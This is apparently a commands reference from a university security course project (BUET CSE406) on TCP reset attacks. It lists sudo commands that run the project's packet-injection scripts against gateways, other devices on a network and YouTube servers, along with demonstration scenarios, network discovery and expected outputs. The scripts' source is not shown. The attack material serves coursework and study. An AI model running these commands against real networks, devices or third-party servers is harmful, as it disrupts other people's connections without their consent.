@@ -1,0 +1,437 @@
+TCP Reset Attack Commands Reference
+BUET CSE406 Computer Security Project
+========================================================
+
+PREREQUISITES:
+========================================================
+✅ Virtual environment activated: source .venv/bin/activate
+✅ Dependencies installed: pip install -r requirements.txt
+✅ Root privileges required: Always use 'sudo'
+✅ Replace IP addresses with your actual network IPs
+
+BASIC ATTACK COMMANDS:
+========================================================
+
+1. STANDARD GATEWAY ATTACK
+---------------------------
+# Attack your network gateway (most common)
+sudo .venv/bin/python3 src/tcp_reset_attack.py --target 192.168.1.1
+
+# With specific network interface
+sudo .venv/bin/python3 src/tcp_reset_attack.py --target 192.168.1.1 --interface wlan0
+
+# Attack with confirmation prompt
+sudo .venv/bin/python3 src/tcp_reset_attack.py --target 192.168.1.1 --gateway 192.168.1.1
+
+2. YOUTUBE-SPECIFIC ATTACKS
+----------------------------
+# Real YouTube traffic attack (most effective for demonstration)
+sudo .venv/bin/python3 real_youtube_demo.py
+
+# Specific YouTube server attack
+sudo .venv/bin/python3 specific_youtube_attack.py
+
+# Ultimate YouTube attack with traffic generation
+sudo .venv/bin/python3 ultimate_youtube_attack.py
+
+3. LOCAL DEMONSTRATION
+----------------------
+# Safe local demo (for testing setup)
+sudo .venv/bin/python3 simple_demo.py
+
+# Demo with client-server setup
+sudo .venv/bin/python3 demo.py
+
+ADVANCED ATTACK OPTIONS:
+========================================================
+
+4. DURATION-LIMITED ATTACKS
+----------------------------
+# Attack for specific duration (5 minutes)
+sudo .venv/bin/python3 src/tcp_reset_attack.py --target 192.168.1.1 --duration 5
+
+# Attack for 10 minutes
+sudo .venv/bin/python3 src/tcp_reset_attack.py --target 192.168.1.1 --duration 10
+
+5. INTERFACE-SPECIFIC ATTACKS
+------------------------------
+# Attack via specific network interface
+sudo .venv/bin/python3 src/tcp_reset_attack.py --target 192.168.1.1 --interface eth0
+
+# WiFi interface attack
+sudo .venv/bin/python3 src/tcp_reset_attack.py --target 192.168.1.1 --interface wlan0
+
+6. CONFIGURATION-BASED ATTACKS
+-------------------------------
+# Attack using configuration file
+sudo .venv/bin/python3 src/tcp_reset_attack.py --config config/attack_config.ini
+
+# Attack with custom settings
+sudo .venv/bin/python3 src/tcp_reset_attack.py --target 192.168.1.1 --packets-per-second 50
+
+DEMONSTRATION SCENARIOS:
+========================================================
+
+SCENARIO 1: BASIC YOUTUBE DISRUPTION
+-------------------------------------
+1. Open YouTube in browser
+2. Start playing a video
+3. Run attack:
+   sudo .venv/bin/python3 real_youtube_demo.py
+4. Observe video buffering/interruption
+5. Stop attack with Ctrl+C
+
+SCENARIO 2: GATEWAY TRAFFIC DISRUPTION
+---------------------------------------
+1. Find gateway IP: ip route | grep default
+2. Run attack:
+   sudo .venv/bin/python3 src/tcp_reset_attack.py --target <GATEWAY_IP>
+3. Test network connectivity during attack
+4. Stop attack with Ctrl+C
+
+SCENARIO 3: SPECIFIC TARGET ATTACK
+-----------------------------------
+1. Choose target device IP on network
+2. Run attack:
+   sudo .venv/bin/python3 src/tcp_reset_attack.py --target <TARGET_IP>
+3. Monitor target device network activity
+4. Stop attack with Ctrl+C
+
+DEBUGGING AND MONITORING:
+========================================================
+
+CHECK SYSTEM STATUS
+-------------------
+# Verify Python environment
+python3 --version
+
+# Check network interfaces
+ip addr show
+
+# Find gateway
+ip route | grep default
+
+# Test connectivity
+ping <target_ip>
+
+# Check virtual environment
+which python3
+echo $VIRTUAL_ENV
+
+TROUBLESHOOTING COMMANDS
+------------------------
+# Fix permission issues
+sudo chown -R $USER:$USER .venv/
+
+# Reinstall dependencies
+pip install --force-reinstall -r requirements.txt
+
+# Check packet injection capability
+sudo .venv/bin/python3 -c "from scapy.all import *; print('Scapy working!')"
+
+# Verify root access
+sudo whoami
+
+NETWORK DISCOVERY
+-----------------
+# Scan local network for targets
+sudo .venv/bin/python3 scripts/network_discovery.py
+
+# Debug network configuration
+sudo .venv/bin/python3 debug_network.py
+
+EXAMPLE EXECUTION SEQUENCE:
+========================================================
+
+# Complete demonstration sequence:
+
+1. Setup verification:
+   source .venv/bin/activate
+   python3 preflight_check.py
+
+2. Network discovery:
+   ip route | grep default
+   # Note the gateway IP (e.g., 192.168.1.1)
+
+3. Start YouTube video in browser
+
+4. Execute attack:
+   sudo .venv/bin/python3 real_youtube_demo.py
+
+5. Observe video disruption
+
+6. Stop attack:
+   Press Ctrl+C
+
+7. Verify network recovery:
+   ping google.com
+
+COMMON IP RANGES TO REPLACE:
+========================================================
+# Replace these example IPs with your actual network IPs:
+
+192.168.1.1    - Common home router gateway
+192.168.0.1    - Alternative home router gateway  
+10.0.0.1       - Some router configurations
+172.16.0.1     - Enterprise networks
+
+# Find your actual IPs with:
+ip route | grep default     # For gateway
+ip addr show                # For your IP and interface
+
+SAFETY REMINDERS:
+========================================================
+⚠️  Always use sudo for packet injection
+⚠️  Only attack networks you own/have permission
+⚠️  Press Ctrl+C to stop attacks immediately
+⚠️  Educational use only (BUET CSE406)
+⚠️  Test on isolated networks when possible
+⚠️  Verify network recovery after attacks
+
+🎯 FOR SUCCESSFUL YOUTUBE DEMONSTRATION:
+Use: sudo .venv/bin/python3 real_youtube_demo.py
+
+WSL2 YOUTUBE ATTACK DEMONSTRATION:
+========================================================
+
+IMPORTANT NOTE: WSL2 Limitations
+---------------------------------
+⚠️  WSL2 cannot disrupt YouTube videos playing in Windows browser
+⚠️  Attack will target YouTube servers but won't affect browser playback
+⚠️  For actual browser disruption, use full Ubuntu Linux machine
+
+WSL2 YOUTUBE SERVER ATTACK COMMANDS:
+------------------------------------
+# These commands will attack YouTube servers but NOT disrupt browser videos
+
+1. REAL YOUTUBE SERVER ATTACK
+------------------------------
+# Generates HTTP requests to YouTube and attacks those connections
+sudo .venv/bin/python3 real_youtube_demo.py
+
+Expected Output:
+- "Starting YouTube traffic generation..."
+- "HTTP request to: https://www.youtube.com/watch?v=..."
+- "RST packet sent to: <YouTube_Server_IP>:443"
+- "Attack Statistics: X RST packets sent, Y connections disrupted"
+
+2. SPECIFIC YOUTUBE SERVER TARGET
+----------------------------------
+# Attack a specific YouTube server identified from browser
+sudo .venv/bin/python3 specific_youtube_attack.py
+
+Expected Output:
+- "Resolving YouTube server: rr2---sn-cqgxocq-q5je.googlevideo.com"
+- "Targeting server at: <Server_IP>:443"
+- "RST injection successful against YouTube server"
+
+3. COMPREHENSIVE YOUTUBE ATTACK
+--------------------------------
+# Most comprehensive attack with traffic generation
+sudo .venv/bin/python3 ultimate_youtube_attack.py
+
+DEMONSTRATION SEQUENCE FOR WSL2:
+=================================
+
+Step 1: Environment Setup
+--------------------------
+cd /home/kausar/CSE-406/tcp_reset_attack
+source .venv/bin/activate
+
+Step 2: Verify Attack Capability
+---------------------------------
+sudo .venv/bin/python3 preflight_check.py
+
+Step 3: Execute YouTube Server Attack
+-------------------------------------
+sudo .venv/bin/python3 real_youtube_demo.py
+
+Step 4: Monitor Attack Progress
+-------------------------------
+# Watch for these indicators:
+✅ "Starting YouTube traffic generation..."
+✅ "HTTP request sent to YouTube server"
+✅ "RST packet sent to: <IP>:443"
+✅ "TCP connection disrupted"
+✅ Final statistics showing packets sent
+
+Step 5: Verify Attack Success
+-----------------------------
+# Successful WSL2 attack will show:
+- 100+ RST packets sent
+- 50+ connections disrupted
+- Multiple YouTube servers targeted
+- Clean termination after timeout
+
+WHAT YOU WILL SEE (WSL2 Attack):
+================================
+✅ Terminal output showing RST packet injection
+✅ YouTube server IPs being targeted
+✅ Connection disruption statistics
+❌ YouTube video in Windows browser continues playing (WSL2 limitation)
+
+LIVE DEMONSTRATION COMMANDS:
+============================
+
+# WORKING WSL2 DEMONSTRATION (Updated):
+echo "=== TCP Reset Attack Demonstration ==="
+echo "Using localhost target for WSL2 compatibility..."
+sudo .venv/bin/python3 simple_demo.py
+
+# WSL2 LOCALHOST ATTACK (Guaranteed to work):
+echo "=== Local TCP Attack Demo ==="
+sudo .venv/bin/python3 demo.py
+
+# SELF-TARGET ATTACK (Shows packet injection):
+echo "=== Self-targeting YouTube demo ==="
+sudo .venv/bin/python3 src/tcp_reset_attack.py --target $(hostname -I | awk '{print $1}')
+
+WSL2 WORKING ATTACK COMMANDS:
+=============================
+
+1. GET YOUR WSL2 IP ADDRESS
+----------------------------
+WSL2_IP=$(hostname -I | awk '{print $1}')
+echo "WSL2 IP: $WSL2_IP"
+
+2. TARGET WSL2 ITSELF (THIS WORKS)
+----------------------------------
+sudo .venv/bin/python3 src/tcp_reset_attack.py --target $WSL2_IP --duration 2
+
+3. LOCALHOST DEMONSTRATION
+--------------------------
+sudo .venv/bin/python3 simple_demo.py
+
+Expected Output:
+- Multiple TCP connections created and attacked
+- RST packets successfully injected
+- 50+ connections disrupted
+- Clean statistics display
+
+4. GATEWAY ATTACK (Limited effectiveness in WSL2)
+-------------------------------------------------
+GATEWAY_IP=$(ip route | grep default | awk '{print $3}')
+echo "Gateway IP: $GATEWAY_IP"
+sudo .venv/bin/python3 src/tcp_reset_attack.py --target $GATEWAY_IP --duration 1
+
+IMMEDIATE WORKING COMMANDS FOR DEMONSTRATION:
+============================================
+
+# Copy and paste these commands one by one:
+
+# 1. Navigate and activate
+cd /home/kausar/CSE-406/tcp_reset_attack
+source .venv/bin/activate
+
+# 2. Quick environment check
+sudo .venv/bin/python3 -c "from scapy.all import *; print('✅ Scapy working')"
+
+# 3. Working localhost attack
+echo "Starting localhost TCP Reset attack..."
+sudo .venv/bin/python3 simple_demo.py
+
+# 4. Self-targeting attack 
+echo "Starting self-targeting attack..."
+sudo .venv/bin/python3 src/tcp_reset_attack.py --target $(hostname -I | awk '{print $1}') --duration 1
+
+WSL2 YOUTUBE TRAFFIC ATTACK (FROM WSL2 BROWSER):
+===============================================
+
+SCENARIO: Attack YouTube traffic generated FROM within WSL2
+-----------------------------------------------------------
+
+# Method 1: Install browser in WSL2 and attack its traffic
+sudo apt update
+sudo apt install firefox-esr lynx curl wget
+
+# Method 2: Generate YouTube traffic from WSL2 and attack it
+echo "=== WSL2 YouTube Traffic Attack ==="
+
+# Step 1: Start packet monitor in background
+sudo .venv/bin/python3 src/packet_monitor.py &
+MONITOR_PID=$!
+
+# Step 2: Generate YouTube traffic from WSL2
+curl -s "https://www.youtube.com/" > /dev/null &
+curl -s "https://www.youtube.com/feed/trending" > /dev/null &
+wget -q -O /dev/null "https://googlevideo.com/" &
+
+# Step 3: Attack the generated traffic
+sudo .venv/bin/python3 src/tcp_reset_attack.py --target $(hostname -I | awk '{print $1}') --duration 3
+
+# Step 4: Clean up
+kill $MONITOR_PID 2>/dev/null
+
+WORKING WSL2 YOUTUBE ATTACK METHODS:
+===================================
+
+METHOD 1: CURL-BASED YOUTUBE ATTACK
+------------------------------------
+# Terminal 1: Start the attack monitoring
+sudo .venv/bin/python3 real_youtube_demo.py
+
+# Terminal 2: Generate YouTube traffic from WSL2
+while true; do
+    curl -s "https://www.youtube.com/" > /dev/null
+    curl -s "https://googlevideo.com/" > /dev/null
+    sleep 2
+done
+
+METHOD 2: WSL2 BROWSER ATTACK
+-----------------------------
+# Install text-based browser in WSL2
+sudo apt install lynx
+
+# Terminal 1: Start attack
+sudo .venv/bin/python3 src/tcp_reset_attack.py --target $(hostname -I | awk '{print $1}') --duration 5
+
+# Terminal 2: Browse YouTube from WSL2
+lynx "https://www.youtube.com/"
+
+METHOD 3: DIRECT TRAFFIC INTERCEPTION
+-------------------------------------
+# Attack your own WSL2 outgoing traffic
+sudo .venv/bin/python3 src/tcp_reset_attack.py --target $(hostname -I | awk '{print $1}') --interface eth0 &
+
+# Generate traffic to attack
+for i in {1..10}; do
+    curl -s "https://www.youtube.com/watch?v=dQw4w9WgXcQ" > /dev/null &
+    sleep 1
+done
+
+COMPLETE WSL2 YOUTUBE DEMONSTRATION:
+===================================
+
+# FIXED VERSION - Copy and run this complete sequence:
+
+echo "=== WSL2 YouTube Attack Demonstration ==="
+cd /home/kausar/CSE-406/tcp_reset_attack
+source .venv/bin/activate
+
+# Use the new WSL2-specific demo script
+echo "Running WSL2 YouTube attack with correct IP targeting..."
+sudo .venv/bin/python3 wsl2_youtube_demo.py
+
+# Alternative method - Update config and run original
+echo "=== Alternative: Fix config and run original demo ==="
+
+# Get WSL2 IP and update config
+WSL2_IP=$(hostname -I | awk '{print $1}')
+echo "WSL2 IP: $WSL2_IP"
+
+# Backup original config
+cp config/attack_config.ini config/attack_config.ini.backup
+
+# Update config with WSL2 IP
+sed -i "s/TARGET_IP = .*/TARGET_IP = $WSL2_IP/" config/attack_config.ini
+
+# Run the demo
+sudo .venv/bin/python3 real_youtube_demo.py
+
+# Restore original config
+cp config/attack_config.ini.backup config/attack_config.ini
+
+IMMEDIATE FIX COMMAND:
+=====================
+# Run this single command for working demonstration:
+sudo .venv/bin/python3 wsl2_youtube_demo.py
